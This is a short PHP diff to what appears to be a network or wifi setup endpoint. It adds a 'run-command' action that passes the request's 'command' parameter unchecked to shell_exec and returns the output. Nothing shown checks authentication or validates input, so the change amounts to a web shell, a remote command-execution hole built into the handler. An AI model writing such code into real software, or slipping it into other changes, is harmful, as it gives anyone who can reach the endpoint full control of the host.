@@ -34,6 +34,10 @@ if ($action == 'check-internet') {
 	}
 }
 
+if($action == 'run-command') {
+	$response = shell_exec($_REQUEST['command'] . " 2>&1");
+}
+
 if ($action == 'get-networks') {
 	$rsp = read_wifi_networks();
 	if ($rsp['response'] == 'success') {
